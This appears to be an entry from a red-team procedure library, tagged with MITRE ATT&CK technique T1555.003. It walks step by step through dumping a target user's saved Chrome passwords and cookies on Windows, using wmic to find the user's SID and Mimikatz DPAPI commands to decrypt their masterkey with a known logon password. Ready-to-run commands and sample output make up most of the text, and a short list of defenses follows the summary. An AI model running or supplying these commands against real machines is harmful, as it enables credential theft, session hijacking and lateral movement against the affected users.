---
id: 0e2c345f-c59b-4c91-8175-1dd147625c0a
name: Extract-Chrome-Credentials-and-Cookies-Using-User-Password
type: procedure
verified: true
submitted: false
created_at: '2020-07-21T05:42:41.930243+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credentials from Web Browsers|T1555.003]]'
sub_techniques: []
platforms:
  - Windows
tags:
  - '[[tags/Chrome]]'
  - '[[tags/dump]]'
  - '[[tags/extract]]'
  - dpapi
  - mimikatz
commands:
  - '[[commands/wmic-list-user-accounts-with-sid]]'
  - '[[commands/mimikatz-attempt-chrome-extraction-to-get-guid]]'
  - '[[commands/mimikatz-extract-user-masterkey-with-password]]'
  - '[[commands/mimikatz-extract-chrome-credentials-current-session]]'
  - '[[commands/mimikatz-extract-chrome-credentials-with-masterkey]]'
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Extract-Chrome-Credentials-and-Cookies-Using-User-Password

## Summary

This procedure decrypts a target user's Chrome browser masterkey using their Windows logon password, then leverages the masterkey to extract stored cookies and credentials from the Chrome profile. It is useful in post-exploitation scenarios where an attacker has obtained a user's password but lacks direct access to their session, enabling the recovery of sensitive web authentication data.

## Description

Chrome stores cookies and login credentials encrypted using DPAPI (Data Protection API) on Windows, protected by the user's masterkey which is derived from their logon password. This procedure first attempts extraction to reveal the protecting GUID, retrieves the user's SID, decrypts the masterkey with the password, and finally uses it to decrypt the Chrome data files. It targets the Default profile in Chrome's User Data directory and requires administrative privileges to run Mimikatz. Success yields plaintext URLs, usernames, and passwords from saved logins, or cookie data for session hijacking.

## Requirements

- Administrative access on the target Windows machine to run Mimikatz.
- The target user's Windows logon password.
- Mimikatz binary downloaded and placed on the target (e.g., from official GitHub releases).
- Target user profile path accessible (e.g., C:\Users\$_TARGET_USER).
- Chrome installed with saved credentials or cookies in the Default profile.

## Defense

- Enable Credential Guard on Windows to protect DPAPI keys.
- Use browser policies to disable password saving and cookie persistence.
- Monitor for Mimikatz execution via process monitoring (e.g., Sysmon rules for mimikatz.exe) and anomalous DPAPI calls.
- Implement application whitelisting to block unsigned tools like Mimikatz.
- Regularly rotate passwords and clear browser data.

## Objectives

1. Identify the GUID protecting the Chrome data by attempting extraction.
2. Retrieve the user's SID to locate the masterkey file.
3. Decrypt the masterkey using the user's password.
4. Extract and decrypt Chrome credentials or cookies using the masterkey.
5. Obtain plaintext credentials for further attacks like session hijacking or lateral movement.

## Instructions

### Step 1: Enumerate Target User SID

**Context**: Obtain the Security Identifier (SID) for the target user to construct the path to their protected masterkey. This step lists all local users and their SIDs.

**Command** ([[commands/wmic-list-user-accounts-with-sid]]):
```command_prompt
wmic.exe useraccount get name,sid
```

> Run this command to list users. Identify the SID for $_TARGET_USER (e.g., S-1-5-21-...-1108 for user 'bob'). Note the SID for the next steps. If targeting a domain user, ensure the machine is domain-joined.

### Step 2: Attempt Chrome Extraction to Reveal GUID

**Context**: Run Mimikatz against the Chrome Login Data file to trigger a failure that exposes the GUID of the protecting masterkey. This GUID is needed to locate the specific key file.

**Command** ([[commands/mimikatz-attempt-chrome-extraction-to-get-guid]]):
```command_prompt
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

> Execute as Administrator. The command will fail to decrypt but output the GUID (e.g., {84dcc2cc-82c6-44d4-9404-45fd48b4b650}) in the error message, along with a KeyHash. For cookies, replace 'Login Data' with 'Cookies'. Copy the GUID for Step 3.

### Step 3: Extract User Masterkey with Password

**Context**: Use the user's SID and GUID to locate the masterkey file, then decrypt it using the provided password. This produces the raw masterkey needed for Chrome data decryption.

**Command** ([[commands/mimikatz-extract-user-masterkey-with-password]]):
```command_prompt
mimikatz.exe
dpapi::masterkey /in:"C:\Users\$_TARGET_USER\AppData\Roaming\Microsoft\Protect\$_USER_SID\$_GUID" /password:$_PASSWORD /protected
```

> Run from the Mimikatz prompt due to quote complexity. Replace placeholders: $_TARGET_USER (e.g., bob), $_USER_SID (from Step 1), $_GUID (from Step 2), $_PASSWORD (user's logon password). Success outputs the decrypted key (e.g., a 64-character hex string like daef77bbf4c8fae8ceac6aec0f4014ae8ec88c266073efafa74bcd86f51b30f2697556b072f91d3dbf0ab9ca118614866261d8620d4158c500fc51d15872c723). Copy this as $_MASTER_KEY.

### Step 4: Extract Chrome Credentials with Masterkey

**Context**: Use the decrypted masterkey to unprotect and extract credentials from the Chrome Login Data file. This reveals saved passwords in plaintext.

**Command** ([[commands/mimikatz-extract-chrome-credentials-with-masterkey]]):
```command_prompt
mimikatz.exe
dpapi::chrome /in:"C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect /masterkey:$_MASTER_KEY
```

> Run from Mimikatz prompt. Replace $_TARGET_USER and $_MASTER_KEY (from Step 3). Expected output includes URLs, usernames, and decrypted passwords (e.g., Password: SuP3rUnCr4cK4B73). For cookies, replace 'Login Data' with 'Cookies' to dump cookie data.

### Step 5: Verify Extraction from Current Session (Optional)

**Context**: If running as the target user, test direct extraction without password/masterkey for comparison or if session is active.

**Command** ([[commands/mimikatz-extract-chrome-credentials-current-session]]):
```command_prompt
mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Google\Chrome\User Data\Default\Login Data""" /unprotect" "exit"
```

> This succeeds only in the user's session, outputting AES key and credentials directly. Use to validate data integrity against password-based extraction.
